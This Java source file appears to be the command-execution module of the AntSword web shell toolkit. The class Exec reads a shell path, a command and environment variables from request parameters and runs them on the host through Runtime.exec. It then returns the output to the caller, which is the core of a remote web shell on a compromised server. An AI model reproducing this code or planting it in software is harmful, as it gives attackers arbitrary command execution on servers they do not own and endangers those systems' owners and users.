package command;

import antSword.Template;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;

public class Exec extends Template {

    @Override
    public String run() throws Exception {
        String z1 = getParam("antswordargbin");
        String z2 = getParam("antswordargcmd");
        String z3 = getParam("antswordargenv");
        return ExecuteCommandCode(z1, z2, z3);

    }

    public String ExecuteCommandCode(String cmdPath, String command, String envstr) throws Exception {
        StringBuffer sb = new StringBuffer();
        String[] c = {cmdPath, !isWin() ? "-c" : "/c", command};
        Map<String, String> readonlyenv = System.getenv();
        Map<String, String> cmdenv = new HashMap<String, String>(readonlyenv);
        String[] envs = envstr.split("\\|\\|\\|asline\\|\\|\\|");
        for (int i = 0; i < envs.length; i++) {
            String[] es = envs[i].split("\\|\\|\\|askey\\|\\|\\|");
            if (es.length == 2) {
                cmdenv.put(es[0], es[1]);
            }
        }
        String[] e = new String[cmdenv.size()];
        int i = 0;
        for (String key : cmdenv.keySet()) {
            e[i] = key + "=" + cmdenv.get(key);
            i++;
        }
        Process p = Runtime.getRuntime().exec(c, e);
        CopyInputStream(p.getInputStream(), sb);
        CopyInputStream(p.getErrorStream(), sb);
        return sb.toString();
    }

    boolean isWin() {
        String osname = System.getProperty("os.name");
        osname = osname.toLowerCase();
        return osname.startsWith("win");
    }

    void CopyInputStream(InputStream is, StringBuffer sb) throws Exception {
        String l;
        BufferedReader br = new BufferedReader(new InputStreamReader(is, cs));
        while ((l = br.readLine()) != null) {
            sb.append(l + "\r\n");
        }
        br.close();
    }
}
